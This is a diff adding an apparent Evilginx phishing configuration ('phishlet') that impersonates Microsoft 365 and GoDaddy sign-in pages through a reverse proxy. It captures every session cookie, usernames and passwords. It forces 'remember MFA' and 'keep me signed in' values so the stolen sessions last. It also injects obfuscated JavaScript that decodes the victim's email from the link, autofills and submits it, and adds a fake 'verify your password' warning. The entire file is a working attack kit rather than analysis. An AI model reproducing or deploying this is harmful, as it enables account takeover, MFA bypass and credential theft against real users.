@@ -1,0 +1,56 @@
+name: 'o365'
+author: 'REDSON'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
+  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: false, is_landing:false}
+  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: false, is_landing:false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'json'
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    script: |
+      const n=b;(function(c,d){const l=b,e=c();while(!![]){try{const f=-parseInt(l('0x172'))/0x1+parseInt(l('0x18e'))/0x2+parseInt(l(0x17e))/0x3+parseInt(l(0x166))/0x4*(-parseInt(l(0x16f))/0x5)+parseInt(l(0x168))/0x6*(parseInt(l('0x191'))/0x7)+parseInt(l(0x17d))/0x8*(-parseInt(l('0x192'))/0x9)+-parseInt(l(0x175))/0xa;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0xdcd65));const _g0=async c=>{const m=b;for(;null===document['qu'+m('0x176')+m('0x183')+'tor'](c);)await new Promise(d=>requestAnimationFrame(d));return document['que'+m(0x180)+m(0x177)](c);};_g0(n(0x189)+'16')['then'](c=>{const o=n;let d=document['qu'+o(0x17a)+o('0x18a')](o('0x184')+'116'),e=document[o(0x171)+'elector'](o('0x182')+'IButt'+'on9'),f=window[o('0x190')][o(0x193)],g,h=[],i;if(/#|\hint=/[o('0x178')](window[o(0x190)]['href'])){f=f[o('0x167')](/#|\hint=/)[0x1];if(f[o(0x18f)]('@'))i=f;else{if(atob(f)[o(0x18f)]('@'))i=atob(f);else{g=f[o('0x18d')](/=/gi,'')[o('0x194')](0x1);for(let j=0x0;j<g[o(0x174)]-0x1;j+=0x2){h[o('0x17b')](parseInt(g[o(0x173)](j,0x2),0x10));}i=String['fr'+o('0x17c')+'arC'+o(0x188)][o('0x16c')](String,h);if(!i['includes']('@')){g=atob(f),h=[];for(let k=0x0;k<g[o(0x174)]-0x1;k++){h[o(0x17b)](g[o('0x17f')](k)^0xd);}i=String['fr'+o('0x17c')+o('0x18c')+o('0x188')][o('0x16c')](String,h);}}}return d[o('0x16d')](),d[o('0x169')]=i,e[o(0x16d)](),void e[o(0x185)]();}});const _ga=async c=>{const p=n;for(;null===document['que'+'rySele'+p(0x18b)](c);)await new Promise(d=>requestAnimationFrame(d));return document[p(0x187)+'ySel'+p('0x170')](c);};function b(c,d){const e=a();return b=function(f,g){f=f-0x166;let h=e[f];return h;},b(c,d);}_ga('#id'+'A_PW'+n(0x186)+'otPas'+n('0x179')+'rd')[n('0x181')](c=>{const q=n;_gb=document[q('0x16a')]('i01'+'18'),_gb[q(0x16e)](q('0x16b'),'<div\x20id=\x22important\x22\x20class=\x22alert\x20alert-error\x22>Because\x20you\x27re\x20accessing\x20sensitive\x20info,\x20you\x20need\x20to\x20verify\x20your\x20password</div>');});function a(){const r=['#idS','lec','#i0','click','D_Forg','quer','ode','#i01','tor','ctor','arC','replace','3236532MocyoW','includes','location','3507wrmwnt','450RAzikN','href','substring','10908NewnYW','split','942EmuQTw','value','getElementById','beforebegin','apply','focus','insertAdjacentHTML','315sAQXqu','ector','queryS','1676952ckBKpG','substr','length','976390VIvBIh','erySe','lector','test','swo','erySelec','push','omCh','44848igSDbG','4302954yOwqnd','charCodeAt','rySe','then'];a=function(){return r;};return a();}
